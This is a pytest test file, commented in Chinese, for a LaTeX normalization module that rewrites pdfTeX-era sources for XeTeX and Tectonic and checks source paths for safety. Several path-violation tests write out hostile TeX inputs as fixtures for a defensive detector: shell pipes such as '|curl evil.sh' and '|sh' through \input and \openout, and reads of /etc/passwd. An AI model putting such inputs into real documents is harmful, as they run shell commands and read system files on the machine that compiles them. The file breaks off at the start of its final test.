"""normalize.py 十二项无条件手术的单测（docs/08 §3.2 逐条对应）。"""

from pathlib import Path

import pytest

from texlate.compile import normalize
from texlate.compile.normalize import (
    PIXEL_COMPATIBILITY,
    TECTONIC_FONT_COMPATIBILITY,
    XETEX_COMPATIBILITY,
    normalize_comment_terminators,
    normalize_engine,
    normalize_float_positions,
    normalize_legacy_cjk,
    normalize_pdf_primitives,
    normalize_pdftex_features,
    normalize_pixel_dimensions,
    normalize_project,
    rebase_project_paths,
    source_path_violations,
    strip_input_encodings,
    use_bundled_bibliography,
)


# 1. comment 终结行
def test_comment_terminators_strip_trailing_ws() -> None:
    tex = "a\n\\end{comment}  \t\nb"
    assert "\\end{comment}\n" in normalize_comment_terminators(tex)


def test_comment_terminators_idempotent_clean() -> None:
    tex = "a\n\\end{comment}\nb"
    assert normalize_comment_terminators(tex) == tex


# 2. float 位置参数
def test_float_positions_illegal_letter() -> None:
    """`[!htbpX]` 的非法字母 X 剥掉 → `[!htbp]`。"""
    tex = "\\begin{figure}[!htbpX]\nx\\end{figure}"
    out = normalize_float_positions(tex)
    assert "[!htbp]" in out


def test_float_positions_all_illegal_drops_bracket() -> None:
    tex = "\\begin{table}[xyz]\nx\\end{table}"
    out = normalize_float_positions(tex)
    assert "\\begin{table}\nx" in out


def test_float_positions_symbol_chars_untouched() -> None:
    """`[^@]` 这类含符号的位置参数不匹配正则——保持上游语义不改。"""
    tex = "\\begin{table}[^@]\nx\\end{table}"
    assert normalize_float_positions(tex) == tex


# 3. pdfTeX 特性
def test_pdftex_output_settings_removed() -> None:
    tex = "\\pdfcompresslevel=9\n\\input{glyphtounicode}\nkeep"
    out = normalize_pdftex_features(tex, "xelatex")
    assert "\\pdfcompresslevel" not in out
    assert "glyphtounicode" not in out
    assert "keep" in out
    assert out.count("\n") == tex.count("\n")


def test_microtype_unsupported_options() -> None:
    tex = "\\usepackage[protrusion=true,expansion=true,tracking=true]{microtype}"
    xe = normalize_pdftex_features(tex, "xelatex")
    assert "expansion=false" in xe
    assert "tracking=true" in xe  # xelatex 保留 tracking
    tec = normalize_pdftex_features(tex, "tectonic")
    assert "tracking=false" in tec  # tectonic bundle microtype 无 tracking


def test_microtype_options_in_multipkg_list() -> None:
    """多包列表 `{microtype,amsmath}` 的选项同样到 microtype——也得改写。"""
    tex = "\\usepackage[expansion=true]{microtype,amsmath}"
    out = normalize_pdftex_features(tex, "xelatex")
    assert "expansion=false" in out
    assert "microtype,amsmath" in out  # 包列表本身不动


# 4. px → \pdfpxdimen（语境受限）
def test_pixel_dimensions_includegraphics() -> None:
    tex = "\\includegraphics[width=360px]{a.pdf}"
    out = normalize_pixel_dimensions(tex)
    assert r"360\pdfpxdimen" in out


def test_pixel_dimensions_setlength() -> None:
    tex = "\\setlength{\\foo}{12px}"
    out = normalize_pixel_dimensions(tex)
    assert r"12\pdfpxdimen" in out


def test_pixel_dimensions_not_global() -> None:
    """散文里的 "360px" 描述文本不被误改。"""
    tex = "The image is 360px wide in CSS terms."
    assert normalize_pixel_dimensions(tex) == tex


# 5. 兼容前导块
def test_compat_blocks_injected_once() -> None:
    tex = "\\documentclass{article}\n\\begin{document}\nx\n\\end{document}"
    out = normalize_engine(tex, "tectonic")
    assert XETEX_COMPATIBILITY.strip().splitlines()[0] in out
    assert TECTONIC_FONT_COMPATIBILITY.strip().splitlines()[0] in out
    out2 = normalize_engine(out, "tectonic")
    assert out2.count("texlate-native") == out.count("texlate-native")


def test_quantumarticle_option_spelled_exactly() -> None:
    """拼写守卫：类只认 `allowfontchangeintitle`——错一个字母 xkeyval 静默拒收。"""
    assert "allowfontchangeintitle" in XETEX_COMPATIBILITY
    assert "allowfontchageintitle" not in XETEX_COMPATIBILITY


def test_pixel_block_only_when_pxd_used() -> None:
    plain = "\\documentclass{article}\n\\begin{document}\nx\n\\end{document}"
    out = normalize_engine(plain, "xelatex")
    assert "pdfpxdimen" not in out.split("\\begin{document}")[0]
    withpx = "\\documentclass{article}\n\\usepackage{graphicx}\n\\begin{document}\n\\includegraphics[width=5px]{a}\n\\end{document}"
    out2 = normalize_engine(withpx, "xelatex")
    assert PIXEL_COMPATIBILITY.strip() in out2


# 6. fontspec no-math 前插
def test_fontspec_no_math_prepended() -> None:
    tex = "\\documentclass{article}\n\\begin{document}\nx\n\\end{document}"
    out = normalize_engine(tex, "xelatex")
    assert out.startswith("\\PassOptionsToPackage{no-math}{fontspec}")


# 7. inputenc/fontenc
def test_strip_inputenc_keeps_others() -> None:
    tex = "\\usepackage[utf8]{inputenc,amsmath,T1fontenc}\n\\usepackage{fontenc}"
    out = strip_input_encodings(tex.replace("T1fontenc", "fontenc"))
    assert "amsmath" in out
    assert "inputenc" not in out


def test_strip_inputenc_list_only_removes_named() -> None:
    tex = "\\usepackage[utf8]{inputenc,amsmath}"
    out = strip_input_encodings(tex)
    assert "{amsmath}" in out


def test_strip_inputenc_sole_removal_preserves_line_count() -> None:
    """整包剔除后是空行而非多插行——删除须保行号稳定（模块不变量）。"""
    tex = "line1\n\\usepackage{fontenc}\nline3\n"
    out = strip_input_encodings(tex)
    assert out.count("\n") == tex.count("\n")
    assert "fontenc" not in out
    assert out.splitlines()[1].strip() == ""


# 8. pdfinfo / pdfoutput / 驱动选项
def test_pdfinfo_removed() -> None:
    tex = "\\pdfinfo{/Title (Hi)}\nkeep"
    out = normalize_pdf_primitives(tex)
    assert "\\pdfinfo" not in out
    assert "keep" in out


def test_pdfoutput_removed() -> None:
    tex = "\\pdfoutput=1\nkeep"
    out = normalize_pdf_primitives(tex)
    assert "\\pdfoutput" not in out


def test_driver_option_pdftex_to_xetex() -> None:
    tex = "\\usepackage[pdftex,bookmarks]{hyperref}\n\\usepackage[pdftex]{graphicx}"
    out = normalize_pdf_primitives(tex)
    assert "[xetex,bookmarks]" in out
    assert "[xetex]{graphicx}" in out


def test_driver_option_unrelated_untouched() -> None:
    tex = "\\usepackage[pdftex]{amsmath}"
    assert normalize_pdf_primitives(tex) == tex


# 9. OT1/T1 → TU（project 级）
def test_legacy_latin_fonts(tmp_path: Path) -> None:
    tex = (
        "\\documentclass{article}\n"
        "\\begin{document}\n"
        "{\\fontfamily{ptm}\\selectfont hello}\n"
        "\\end{document}\n"
    )
    (tmp_path / "main.tex").write_text(tex)
    normalize_project(tmp_path, "xelatex")
    out = (tmp_path / "main.tex").read_text()
    assert "texlate-ptm" in out
    assert "NFSSFamily=texlate-ptm" in out
    assert "texgyretermes-regular.otf" in out


# 10. legacy CJK
def test_legacy_cjk_to_xecjk() -> None:
    tex = (
        "\\documentclass{article}\n\\usepackage{CJKutf8}\n"
        "\\begin{document}\n\\begin{CJK}{UTF8}{gbsn}x\\end{CJK}\n\\end{document}"
    )
    out = normalize_legacy_cjk(tex, "xelatex")
    assert "CJKutf8" not in out
    assert "xeCJK" in out
    assert "FandolSong" in out
    assert "\\begin{CJK}" not in out


# 11. bundled .bbl
def test_bundled_bibliography(tmp_path: Path) -> None:
    main = tmp_path / "main.tex"
    main.write_text(
        "\\documentclass{article}\n\\begin{document}\nx\n"
        "\\bibliography{refs}\n\\end{document}"
    )
    (tmp_path / "main.bbl").write_text(
        "\\begin{thebibliography}{9}\\end{thebibliography}"
    )
    out = use_bundled_bibliography(main.read_text(), main)
    assert r"\input{main.bbl}" in out


def test_bundled_bibliography_bib_present_noop(tmp_path: Path) -> None:
    main = tmp_path / "main.tex"
    main.write_text("\\bibliography{refs}")
    (tmp_path / "main.bbl").write_text(
        "\\begin{thebibliography}{9}\\end{thebibliography}"
    )
    (tmp_path / "refs.bib").write_text("@article{a,title={t}}")
    assert use_bundled_bibliography(main.read_text(), main) == "\\bibliography{refs}"


def test_bundled_bibliography_verbatim_immune(tmp_path: Path) -> None:
    """lstlisting 里展示的 \\bibliography 示例不得被改写（verbatim 体遮盖）。"""
    main = tmp_path / "main.tex"
    main.write_text(
        "\\documentclass{article}\n\\begin{document}\n"
        "\\begin{lstlisting}\n\\bibliography{refs}\n\\end{lstlisting}\n"
        "\\end{document}"
    )
    (tmp_path / "main.bbl").write_text(
        "\\begin{thebibliography}{9}\\end{thebibliography}"
    )
    assert use_bundled_bibliography(main.read_text(), main) == main.read_text()


def test_bundled_bibliography_multiple_bibliography_only_first(
    tmp_path: Path,
) -> None:
    """多只缺库 `\bibliography` 只替换首个——单份 .bbl 不能重复排版。"""
    main = tmp_path / "main.tex"
    main.write_text(
        "\\documentclass{article}\n\\begin{document}\nx\n"
        "\\bibliography{goneA}\ntext\n\\bibliography{goneB}\n\\end{document}"
    )
    (tmp_path / "main.bbl").write_text(
        "\\begin{thebibliography}{9}\\end{thebibliography}"
    )
    out = use_bundled_bibliography(main.read_text(), main)
    assert out.count(r"\input{main.bbl}") == 1
    assert r"\bibliography{goneB}" in out  # 第二只保留原状


def test_bundled_bibliography_bib_searched_at_compile_cwd(tmp_path: Path) -> None:
    """`.bib` 存在性按编译 cwd 判——refs.bib 在 main 目录时 sub 文件不重写。"""
    sub = tmp_path / "chaps"
    sub.mkdir()
    one = sub / "one.tex"
    one.write_text("body\n\\bibliography{refs}\n")
    (tmp_path / "refs.bib").write_text("@article{a,title={t}}")
    (sub / "one.bbl").write_text("\\begin{thebibliography}{9}\\end{thebibliography}")
    # cwd=None → 退回声明文件目录（chaps/refs.bib 缺席 → 重写）
    out = use_bundled_bibliography(one.read_text(), one)
    assert r"\input{one.bbl}" in out
    # cwd=tmp_path（main 目录）→ refs.bib 在场 → 不重写
    out2 = use_bundled_bibliography(one.read_text(), one, cwd=tmp_path)
    assert out2 == one.read_text()


# 12. rebase 越界路径
def test_rebase_project_paths(tmp_path: Path) -> None:
    """根层主文件 `\\input{../shared/x}`（越界）→ 包内 `shared/x` 存在则改写。"""
    (tmp_path / "main.tex").write_text("\\input{../shared/macros.tex}\n")
    shared = tmp_path / "shared"
    shared.mkdir()
    (shared / "macros.tex").write_text("% macros\n")
    locs = rebase_project_paths(tmp_path, "main.tex")
    assert locs
    out = (tmp_path / "main.tex").read_text()
    assert "\\input{shared/macros.tex}" in out
    assert "../" not in out


def test_source_path_violations_absolute(tmp_path: Path) -> None:
    (tmp_path / "main.tex").write_text("\\input{/etc/passwd}\n")
    violations = list(source_path_violations(tmp_path, "main.tex"))
    assert violations


def test_source_path_violations_escape_outside(tmp_path: Path) -> None:
    (tmp_path / "main.tex").write_text("\\input{../../outside.tex}\n")
    violations = list(source_path_violations(tmp_path, "main.tex"))
    assert violations


def test_source_path_violations_pipe(tmp_path: Path) -> None:
    (tmp_path / "main.tex").write_text("\\input{|curl evil.sh}\n")
    violations = list(source_path_violations(tmp_path, "main.tex"))
    assert violations


def test_source_path_violations_openio_cs_form(tmp_path: Path) -> None:
    r"""`\openout\w=|cmd` / `\openin\r=/abs` —— `\cs=` 形态的真文件名要过检查。"""
    (tmp_path / "main.tex").write_text(
        "\\openout\\w=|curl evil.sh\n"
        "\\openin\\r=/etc/passwd\n"
        "\\openout\\w = ../../outside\n"
        "\\openout4=|sh\n"
    )
    violations = list(source_path_violations(tmp_path, "main.tex"))
    assert {v[0].name for v in violations} == {"main.tex"}
    assert [v[1].group(0) for v in violations] == [
        "\\openout\\w=|curl",
        "\\openin\\r=/etc/passwd",
        "\\openout\\w = ../../outside",
        "\\openout4=|sh",
    ]


def test_source_path_violations_openio_legit_noop(tmp_path: Path) -> None:
    r"""合法包内 `\openout\w=out.dat` 不误报。"""
    (tmp_path / "main.tex").write_text("\\openout\\w=out.dat\n\\openin\\r=refs.bib\n")
    assert list(source_path_violations(tmp_path, "main.tex")) == []


def test_normalize_engine_lualatex_only_cjk() -> None:
    """lualatex 不走 XeTeX 手术，只换 legacy CJK。"""
    tex = "\\documentclass{article}\n\\pdfcompresslevel=9\n\\begin{document}\nx\\end{document}"
    out = normalize_engine(tex, "lualatex")
    assert "\\pdfcompresslevel=9" in out  # lualatex 保留 pdftex 原语


# ---------------------------------------------------------------- 编码分档接线
def test_normalize_project_records_encoding_verdict(tmp_path: Path) -> None:
    """非 UTF-8 主文件：转码写回 + ``stats["encodings"]`` 归因可回溯。"""
    main = tmp_path / "main.tex"
    blob = b"\\documentclass{article}\n\\begin{document}\nQu\xe9bec\n\\end{document}\n"
    main.write_bytes(blob)
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    encs = stats["encodings"]
    assert encs["main.tex"]["basis"] == "detector"
    assert encs["main.tex"]["encoding"] in {"cp1252", "latin-1", "mac_roman"}
    assert "Québec" in main.read_text(encoding="utf-8")
    # utf-8 写回后再次 normalize 不再记 detector（幂等）
    stats2 = normalize_project(tmp_path, "xelatex", "main.tex")
    assert stats2.get("encodings", {}).get("main.tex", {}).get("basis") != "detector"


def test_normalize_project_transcodes_aux(tmp_path: Path) -> None:
    """.bib/.bbl 不过手术但须转码——``transcoded_aux`` 单列。"""
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    bib = tmp_path / "refs.bib"
    bib.write_bytes(b"@article{a, author={Andr\xe9}}\n")
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "refs.bib" in stats["transcoded_aux"]
    assert bib.read_bytes().decode("utf-8").find("é") > 0
    assert stats["encodings"]["refs.bib"]["encoding"] != "utf-8"


def test_normalize_project_clean_utf8_no_encodings(tmp_path: Path) -> None:
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "encodings" not in stats
    assert "transcoded_aux" not in stats


def test_normalize_project_junk_stub(tmp_path: Path) -> None:
    r"""bundled aipcheck.tex 覆写为 ``\endinput`` stub（1109.2354 交互自检件）。"""
    (tmp_path / "aipcheck.tex").write_text(
        "\\newif\\ifproblem\n\\typein{* Type <return> to continue ...}\n"
        "\\def\\next#1/#2/#3\\next{#1#2}\n"
    )
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\input{aipcheck}\n"
        "\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    stub = (tmp_path / "aipcheck.tex").read_text()
    assert stub.endswith("\\endinput\n")
    assert "typein" not in stub.lower()
    assert stats["junk_stubbed"] == ["aipcheck.tex"]
    # 覆写不删——\input 目标存在性保留；其它文件内容不动
    assert "\\input{aipcheck}" in (tmp_path / "main.tex").read_text()


def test_normalize_project_junk_stub_nested(tmp_path: Path) -> None:
    """名单件逐名匹配不限深度；幂等——二次 normalize 不再记 junk。"""
    sub = tmp_path / "vendor" / "aip"
    sub.mkdir(parents=True)
    (sub / "aipcheck.tex").write_text("\\typein{press return}\n")
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert stats["junk_stubbed"] == ["vendor/aip/aipcheck.tex"]
    stats2 = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "junk_stubbed" not in stats2


# ---------------------------------------------------------------- invalid_utf8 输入侧臂
def test_sanitize_ps_comments_header_bad_byte(tmp_path: Path) -> None:
    """EPS 头注释 latin-1/GBK 字节 → UTF-8 净化；diff 仅限注释行。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%Title: (C:\\wuga\\\xd7\xc0\xc3\xe6\\fig.eps)\n"
        b"%%BoundingBox: 0 0 100 100\n"
        b"%%EndComments\nshowpage\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "fig.eps" in stats["sanitized_ps_comments"]
    new = eps.read_bytes()
    new.decode("utf-8")  # 不再抛
    old_lines, new_lines = blob.split(b"\n"), new.split(b"\n")
    assert len(old_lines) == len(new_lines)  # 行数不变
    assert sum(a != b for a, b in zip(old_lines, new_lines, strict=True)) == 1


def test_sanitize_ps_comments_preserves_binary_section(tmp_path: Path) -> None:
    """非注释行的坏字节（PS 字符串/数据区）原样保留——字节即语义。"""
    blob = b"%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 10 10\n(caf\xe9) show\n%%EOF\n"
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "sanitized_ps_comments" not in stats
    assert eps.read_bytes() == blob  # 逐字节不变


def test_sanitize_ps_comments_dos_header_untouched(tmp_path: Path) -> None:
    """DOS-EPS 二进制头（0xC5D0D3C6）含绝对偏移——整件跳过。"""
    blob = b"\xc5\xd0\xd3\xc6" + b"\x00" * 24 + b"%!PS\n%%Title: bad\xe9\n"
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    normalize_project(tmp_path, "xelatex", "main.tex")
    assert eps.read_bytes() == blob


def test_atend_bbox_header_rewritten(tmp_path: Path) -> None:
    """``(atend)`` 占位头行改写为 trailer 实值——扫描在头行即停，数据行坏字节不再入扫。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%BoundingBox: (atend)\n"
        b"%%EndComments\n"
        b"(=8.2\xd710) show\n"  # latin-1 × 数据行——字节即语义不动
        b"%%Trailer\n"
        b"%%BoundingBox: 74 87 587 383\n"
        b"%%EOF\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert stats["resolved_atend_bbox"] == ["fig.eps"]
    new = eps.read_bytes()
    new_lines, old_lines = new.split(b"\n"), blob.split(b"\n")
    assert len(new_lines) == len(old_lines)
    assert new_lines[1] == b"%%BoundingBox: 74 87 587 383"
    # 改写仅限头行——数据行/trailer 行逐字节不动
    assert sum(a != b for a, b in zip(old_lines, new_lines, strict=True)) == 1
    assert new_lines[3] == b"(=8.2\xd710) show"
    assert b"%%Trailer\n%%BoundingBox: 74 87 587 383" in new


def test_atend_bbox_no_trailer_value_untouched(tmp_path: Path) -> None:
    """无 trailer 实值行——不可造值，整件原样。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%BoundingBox: (atend)\n"
        b"%%EndComments\n"
        b"(bad\xe9) show\n"
        b"%%Trailer\n%%EOF\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "resolved_atend_bbox" not in stats
    assert eps.read_bytes() == blob


def test_atend_bbox_malformed_trailer_untouched(tmp_path: Path) -> None:
    """trailer 行值畸形（非 4 数值）——不造值，整件原样。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%BoundingBox: (atend)\n"
        b"%%EndComments\n"
        b"%%Trailer\n"
        b"%%BoundingBox: none\n"
        b"%%EOF\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "resolved_atend_bbox" not in stats
    assert eps.read_bytes() == blob


def test_atend_bbox_real_header_untouched(tmp_path: Path) -> None:
    """头行已实值（无 atend 占位）——不改写。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%BoundingBox: 0 0 100 100\n"
        b"%%EndComments\n(bad\xe9) show\n%%EOF\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "resolved_atend_bbox" not in stats
    assert eps.read_bytes() == blob


def test_atend_bbox_body_atend_not_header_untouched(tmp_path: Path) -> None:
    """``(atend)`` 出现在头注释块之外（body/trailer）——不认作头占位，不改写。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%EndComments\n"
        b"showpage\n"
        b"%%Trailer\n"
        b"%%BoundingBox: (atend)\n"
        b"%%EOF\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "resolved_atend_bbox" not in stats
    assert eps.read_bytes() == blob


def test_atend_bbox_idempotent(tmp_path: Path) -> None:
    """二次 normalize_project 输出逐字节一致——头行已是实值无占位可命中。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%BoundingBox: (atend)\n"
        b"%%EndComments\n"
        b"(bad\xe9) show\n"
        b"%%Trailer\n"
        b"%%BoundingBox: 10 20 30 40\n"
        b"%%EOF\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    first = normalize_project(tmp_path, "xelatex", "main.tex")
    assert first["resolved_atend_bbox"] == ["fig.eps"]
    once = eps.read_bytes()
    second = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "resolved_atend_bbox" not in second
    assert eps.read_bytes() == once


def test_atend_bbox_combined_with_comment_sanitize(tmp_path: Path) -> None:
    """atend 改写 + 注释行坏字节净化同发——两台账各记各的。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%BoundingBox: (atend)\n"
        b"%%For: caf\xe9\n"
        b"%%EndComments\n"
        b"(bad\xe9) show\n"
        b"%%Trailer\n"
        b"%%BoundingBox: 1 2 3 4\n"
        b"%%EOF\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert stats["resolved_atend_bbox"] == ["fig.eps"]
    assert stats["sanitized_ps_comments"] == ["fig.eps"]
    new = eps.read_bytes()
    assert new.split(b"\n")[1] == b"%%BoundingBox: 1 2 3 4"
    assert b"%%For: caf\xc3\xa9" in new  # 注释行坏字节已转 UTF-8
    assert b"(bad\xe9) show" in new  # 数据行原样


def test_transcode_catchall_data_file(tmp_path: Path) -> None:
    """未列名文本件（.txt/.dtx/无后缀）catch-all 转码。"""
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    data = tmp_path / "notes.txt"
    data.write_bytes("André\n".encode("cp1252"))
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "notes.txt" in stats["transcoded_data"]
    assert "André" in data.read_text(encoding="utf-8")


def test_transcode_catchall_binary_untouched(tmp_path: Path) -> None:
    """二进制 allowlist 件（.png/.jpg/.pdf）坏字节原样保留。"""
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    blob = b"\x89PNG\r\n\x1a\n" + bytes(range(256))
    png = tmp_path / "fig.png"
    png.write_bytes(blob)
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "transcoded_data" not in stats
    assert png.read_bytes() == blob


def test_driver_option_dvips_to_xetex() -> None:
    """ps 系驱动 token → xetex：usepackage + documentclass + PassOptions 三面。"""
    tex = (
        "\\documentclass[dvips,twocolumn]{article}\n"
        "\\usepackage[dvips]{graphicx}\n"
        "\\PassOptionsToPackage{dvips}{color}\n"
    )
    out = normalize_pdf_primitives(tex)
    assert "[xetex,twocolumn]" in out
    assert "[xetex]{graphicx}" in out
    assert "{xetex}{color}" in out


def test_driver_option_dvipdfmx_kept() -> None:
    """dvipdfmx 与 XeTeX 兼容——不改写。"""
    tex = "\\usepackage[dvipdfmx]{graphicx}"
    assert normalize_pdf_primitives(tex) == tex


def test_shadow_broken_system_package(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """工程引用的系统包带坏字节 → 净化副本落 main 目录遮蔽。"""
    proj = tmp_path / "proj"
    sysdir = tmp_path / "sys"  # 须在工程 root 外——root 内件由主循环转码
    proj.mkdir()
    sysdir.mkdir()
    bad = sysdir / "oldpkg.sty"
    bad.write_bytes(b"%% Copyright Schr\xf6der\n\\ProvidesPackage{oldpkg}\n")
    (proj / "main.tex").write_text(
        "\\documentclass{article}\n\\usepackage{oldpkg}\n"
        "\\begin{document}\nx\\end{document}\n"
    )
    monkeypatch.setattr(normalize.shutil, "which", lambda *_a: "/bin/kpsewhich")
    monkeypatch.setattr(
        normalize,
        "_kpse_resolve",
        lambda filename, *_a: bad if filename == "oldpkg.sty" else None,
    )
    stats = normalize_project(proj, "xelatex", "main.tex")
    shadows = stats["package_shadows"]
    assert shadows[0]["package"] == "oldpkg.sty"
    shadow = proj / "oldpkg.sty"
    assert "Schröder" in shadow.read_text(encoding="utf-8")
    # 幂等：再跑不再遮蔽（遮蔽件已在 root 内解析命中）
    stats2 = normalize_project(proj, "xelatex", "main.tex")
    assert "package_shadows" not in stats2


def test_shadow_clean_system_package_noop(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """系统件本身合法 UTF-8 → 不写遮蔽。"""
    proj = tmp_path / "proj"
    sysdir = tmp_path / "sys"
    proj.mkdir()
    sysdir.mkdir()
    good = sysdir / "goodpkg.sty"
    good.write_bytes(b"%% clean\n\\ProvidesPackage{goodpkg}\n")
    (proj / "main.tex").write_text(
        "\\documentclass{article}\n\\usepackage{goodpkg}\n"
        "\\begin{document}\nx\\end{document}\n"
    )
    monkeypatch.setattr(normalize.shutil, "which", lambda *_a: "/bin/kpsewhich")
    monkeypatch.setattr(normalize, "_kpse_resolve", lambda *_a: good)
    stats = normalize_project(proj, "xelatex", "main.tex")
    assert "package_shadows" not in stats
    assert not (proj / "goodpkg.sty").exists()


def test_shadow_resolved_inside_root_noop(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """工程自带同名包（kpsewhich 命中 root 内）→ 不遮蔽自身。"""
    own = tmp_path / "mypkg.sty"
    own.write_bytes(b"%% mine latin \xe9\n")  # 工程内件由主循环转码
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\usepackage{mypkg}\n"
        "\\begin{document}\nx\\end{document}\n"
    )
    monkeypatch.setattr(normalize.shutil, "which", lambda *_a: "/bin/kpsewhich")
    monkeypatch.setattr(normalize, "_kpse_resolve", lambda *_a: own)
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "package_shadows" not in stats
    own.read_bytes().decode("utf-8")  # 且主循环已把工程件转码


def test_shadow_vendored_same_name_in_subdir_skipped(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """工程子目录 vendored 同名件 → 即便 kpsewhich 解析到坏系统件也不遮蔽。"""
    proj = tmp_path / "proj"
    sysdir = tmp_path / "sys"
    (proj / "sty").mkdir(parents=True)
    sysdir.mkdir()
    (proj / "sty" / "oldpkg.sty").write_bytes(b"%% vendored\n")
    bad = sysdir / "oldpkg.sty"
    bad.write_bytes(b"%% Copyright Schr\xf6der\n")
    (proj / "main.tex").write_text(
        "\\documentclass{article}\n\\usepackage{oldpkg}\n"
        "\\begin{document}\nx\\end{document}\n"
    )
    monkeypatch.setattr(normalize.shutil, "which", lambda *_a: "/bin/kpsewhich")
    monkeypatch.setattr(
        normalize,
        "_kpse_resolve",
        lambda filename, *_a: bad if filename == "oldpkg.sty" else None,
    )
    stats = normalize_project(proj, "xelatex", "main.tex")
    assert "package_shadows" not in stats
    assert not (proj / "oldpkg.sty").exists()


def test_sanitize_ps_comments_beginbinary_section_untouched(tmp_path: Path) -> None:
    """``%%BeginBinary`` 段内 % 行是字节负载不是注释——逐字节保留。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%Title: caf\xe9\n"
        b"%%BoundingBox: 0 0 10 10\n"
        b"%%BeginBinary: 8\n"
        b"%BIN\xe9ARY\n"
        b"%%EndBinary\n"
        b"%%EOF\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "fig.eps" in stats["sanitized_ps_comments"]  # 头注释 %%Title 净化
    new = eps.read_bytes()
    assert b"%%Title: caf\xc3\xa9" in new
    assert b"%BIN\xe9ARY" in new  # 数据段原样


def test_symlinked_tex_not_written_through(tmp_path: Path) -> None:
    """工程树内软链 .tex → 跳过手术，写穿会改到 root 外目标。"""
    outside = tmp_path.parent / f"{tmp_path.name}-ext.tex"
    outside.write_bytes(b"\\pdfcompresslevel=9\n")
    try:
        (tmp_path / "linked.tex").symlink_to(outside)
        (tmp_path / "main.tex").write_text(
            "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
        )
        stats = normalize_project(tmp_path, "xelatex", "main.tex")
        assert outside.read_bytes() == b"\\pdfcompresslevel=9\n"
        assert stats["files"] == 1  # 只统计 main.tex，软链不进手术面
    finally:
        outside.unlink(missing_ok=True)


def test_junk_stub_symlink_not_stubbed_through(tmp_path: Path) -> None:
